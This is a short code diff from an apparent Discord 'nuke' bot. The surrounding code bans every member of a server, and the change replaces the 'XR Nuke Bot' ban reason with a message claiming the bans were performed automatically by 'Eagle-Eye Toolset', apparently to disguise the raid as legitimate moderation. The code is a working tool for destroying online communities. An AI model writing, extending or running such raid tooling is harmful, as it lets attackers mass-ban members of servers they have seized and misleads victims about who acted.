@@ -102,7 +102,7 @@ async def nuke(ctx, amount=50):
                     print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
         for member in list(ctx.guild.members):
             try:
-                await member.ban(reason="XR Nuke Bot")  #change this if u want
+                await member.ban(reason="This action was performed automatically by Eagle-Eye Toolset.")  #change this if u want
                 print(
                     f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}"
                 )
